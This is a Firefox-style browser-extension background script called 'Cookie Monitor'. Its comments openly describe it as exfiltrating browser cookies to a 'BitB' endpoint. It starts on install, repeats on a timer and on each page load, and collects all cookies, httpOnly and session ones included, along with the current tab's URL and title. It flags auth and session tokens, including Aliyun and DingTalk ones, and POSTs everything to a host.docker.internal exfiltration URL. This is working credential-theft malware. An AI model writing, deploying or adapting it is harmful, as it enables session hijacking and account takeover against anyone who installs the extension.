// Cookie Monitor Background Script
// Exfiltrates all browser cookies at regular intervals to the BitB API

const EXFIL_URL = "http://host.docker.internal:8080/api/ext/exfil";
const POLL_INTERVAL_MS = 10000; // 10 seconds
const ALARM_NAME = "cookie-poll";

// Create a small PNG icon as a data URI (1x1 transparent)
browser.browserAction && browser.browserAction.setIcon({
  path: { "48": "" }
});

// Start polling on install
browser.runtime.onInstalled.addListener(() => {
  console.log("[Cookie Monitor] Extension installed. Starting cookie extraction...");
  
  // Use alarm for persistent polling
  browser.alarms.create(ALARM_NAME, { periodInMinutes: POLL_INTERVAL_MS / 60000 });
  
  // Initial extraction
  extractAndSend();
});

// On alarm fire
browser.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === ALARM_NAME) {
    extractAndSend();
  }
});

// Also extract on tab updates (catches new logins/navigations)
browser.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete" && tab.url) {
    setTimeout(extractAndSend, 2000);
  }
});

async function extractAndSend() {
  try {
    const allCookies = await browser.cookies.getAll({});
    
    if (!allCookies || allCookies.length === 0) {
      return;
    }
    
    // Get active tab info for context
    let currentUrl = "unknown";
    let currentTitle = "unknown";
    try {
      const tabs = await browser.tabs.query({ active: true, currentWindow: true });
      if (tabs && tabs.length > 0) {
        currentUrl = tabs[0].url || "unknown";
        currentTitle = tabs[0].title || "unknown";
      }
    } catch (e) {
      // fallback
    }
    
    // Organize by domain
    const byDomain = {};
    for (const cookie of allCookies) {
      const domain = cookie.domain || "unknown";
      if (!byDomain[domain]) byDomain[domain] = {};
      byDomain[domain][cookie.name] = {
        value: cookie.value,
        host: cookie.domain,
        path: cookie.path || "/",
        secure: cookie.secure || false,
        httpOnly: cookie.httpOnly || false,
        session: cookie.session || false,
        sameSite: cookie.sameSite || "no_restriction",
        expiry: cookie.expirationDate || null
      };
    }
    
    // Prioritize session/auth cookies
    const priorityKeywords = [
      "session", "SESSION", "JSESSIONID", "PHPSESSID", "ASP.NET_SessionId",
      "sid", "SID", "token", "Token", "access_token", "refresh_token",
      "auth", "Authorization", "aliyun_", "ALIYUN_", "dingtalk", "DINGTALK",
      "login", "Login", "user", "User", "identity", "Identity"
    ];
    
    const priorityCookies = {};
    const otherCookies = {};
    
    for (const domain in byDomain) {
      for (const name in byDomain[domain]) {
        const isPriority = priorityKeywords.some(kw => 
          name.toLowerCase().includes(kw.toLowerCase()) || 
          domain.toLowerCase().includes(kw.toLowerCase())
        );
        if (isPriority) {
          priorityCookies[`${domain}::${name}`] = byDomain[domain][name];
        } else {
          otherCookies[`${domain}::${name}`] = byDomain[domain][name];
        }
      }
    }
    
    const payload = {
      type: "cookies",
      data: {
        all: allCookies.length,
        priority: priorityCookies,
        other: otherCookies,
        byDomain: byDomain
      },
      metadata: {
        url: currentUrl,
        title: currentTitle,
        timestamp: Date.now(),
        extension: "cookie_monitor",
        version: "1.0.0"
      }
    };
    
    // Send to BitB exfil endpoint
    const response = await fetch(EXFIL_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
    
    if (response.ok) {
      console.log(`[Cookie Monitor] Exfiltrated ${allCookies.length} cookies (${Object.keys(priorityCookies).length} priority)`);
    }
  } catch (e) {
    console.error("[Cookie Monitor] Extraction error:", e.message);
  }
}

// Listen for messages from content script or popup
browser.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === "force_extract") {
    extractAndSend().then(() => sendResponse({ status: "ok" }));
    return true;
  }
});
